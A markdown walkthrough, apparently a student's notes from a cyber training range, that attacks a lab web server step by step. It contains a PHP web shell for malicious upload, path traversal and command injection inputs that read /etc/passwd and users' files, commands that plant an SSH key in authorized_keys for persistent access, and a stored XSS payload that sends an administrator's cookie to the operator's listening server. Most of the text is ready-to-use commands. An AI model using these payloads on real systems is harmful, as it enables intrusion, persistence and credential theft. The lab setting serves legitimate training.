## Server-Side injection
## Post method: 
    ../../../../../../ect/hosts
    ../../../../../../ect/passwd
________________________________________________________________________________________________________________
## Malicious File Upload: 
    <HTML><BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <?php
    if($_GET['cmd']) {
      system($_GET['cmd']);
      }
    ?>
    </pre>
    </BODY></HTML>
### 1: place to upload
### 2: access to upload
### 3: call to upload
________________________________________________________________________________________________________________
## Scheme of Maneuver:
## >Jump Box
## ->T1:10.100.28.40
### Target Section:
### T1
### Hostname: Donovian_MI_websvr
### IP: 10.100.28.40
### OS: unknown
### Creds:unknown
### Last Known SSH Port: unknown
### PSP: Unknown
### Malware: Unknown
### Action: Conduct approved Web Exploitation techniques to collect intellegence.
________________________________________________________________________________________________________________
## SSH to your tunnel: 
    ssh -MS /tmp/jump student@10.50.25.229
________________________________________________________________________________________________________________
## New Pane set up a dynamic port forward: 
    ssh -S /tmp/jump jump -O forward -D9050
________________________________________________________________________________________________________________
## New Pane start scanning: 
    proxychains nmap -T4 -Pn 10.100.28.40
```
Nmap scan report for 10.100.28.40
Host is up (0.00059s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds

```
________________________________________________________________________________________________________________
## Validate the ports found: 
    proxychains nc 10.100.28.40 80        #discovered http
    proxychains nc 10.100.28.40 4444      #discovered alt ssh
________________________________________________________________________________________________________________
## Set up port forward tunnel to connect to both of the ports above: 
    ssh -S /tmp/jump jump -O forward -L10001:10.100.28.40:80 -L10002:10.100.28.40:4444
________________________________________________________________________________________________________________
## Run firefox to access the http port discovered through the tunnel: 
    firefox http://127.0.0.1:10001
________________________________________________________________________________________________________________
## Next utilize scripts to gather more info: (use one pane for viewing the scripts, previous pane for scanning.)
    ls /usr/share/nmap/scripts/ | grep http
```
http-enum.nse
```
    proxychains nmap -T4 -Pn 10.100.28.40 --script=http-enum.nse
```
Nmap scan report for 10.100.28.40
Host is up (0.00060s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds

```
________________________________________________________________________________________________________________
## The above scan shows directories worth taking a look at: (IN THE URL ON FIREFOX) 
    http://127.0.0.1:10001/robots.txt
    http://127.0.0.1:10001/css/
    http://127.0.0.1:10001/images/
    http://127.0.0.1:10001/uploads/
________________________________________________________________________________________________________________
## In the /uploads/ clicking the link reveals the message: 
    http://127.0.0.1:10001/uploads/message
```
Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
Please send me a corrected cert with the right now.

I took my online training from the following website

10.100.28.55
```
## (Training Site Location)
________________________________________________________________________________________________________________
## Check the path in the robots.txt: 
    http://127.0.0.1:10001/net_test/industry_check.php
## Test different commands in different fields: (path to test)
```
; pwd
; whoami
; ls -la /home/billybob
; cat /etc/passwd
```
## (Command Injection 1)
________________________________________________________________________________________________________________
## While here locate romanoff's file: 
    ; find / -iname *romanoff* 2>/dev/null
    ; ls -la /home/romanoff@mi.ru/
    ; cat /home/romanoff@mi.ru/contracts    
## (Command Injection 2)
________________________________________________________________________________________________________________
## Uploading SSH Key: 
    ; ls -la /home/billybob                                  #check if .ssh exists
    ; mkdir /home/billybob/.ssh/                             #make .ssh in users home folder if it does not exist
    ssh-keygen -t rsa -b 4096                                #creating ssh private and public keys
    cat ~/.ssh/id_rsa.pub                                    #copying public key to paste into below command
    ; echo "your public ssh key here" >> /home/billybob/.ssh/authorized_keys    #placing ssh key in directory
    ; cat /home/billybob/.ssh/authorized_keys                #verifying the ssh key was emplaced
________________________________________________________________________________________________________________
## Authenticate in a new pane to the alt ssh port with the user discovered: 
    ssh -MS /tmp/t1 billybob@127.0.0.1 -p10002
## (Malicious Upload)
________________________________________________________________________________________________________________
## On the user cat /etc/passwd: 
    cat /etc/passwd
________________________________________________________________________________________________________________
## Head back to the firefox website and check the trouble ticket: 
    http://127.0.0.1:10001/TT/ticket.php    #there is a link on one of the previous pages
## (VIP email address)
________________________________________________________________________________________________________________
## On linux opstation run for the next part to work: 
    python3 -m http.server
________________________________________________________________________________________________________________
## Next retreive the admins cookie by running this in the comment section on the trouble ticket page: 
### Name: Whatever you want, just use your linux op station float IP 
    <script>document.location="http://10.50.21.223:8000/"+document.cookie;</script>
## (Stored Cross Site Scripting XSS)
________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________


________________________________________________________________________________________________________________
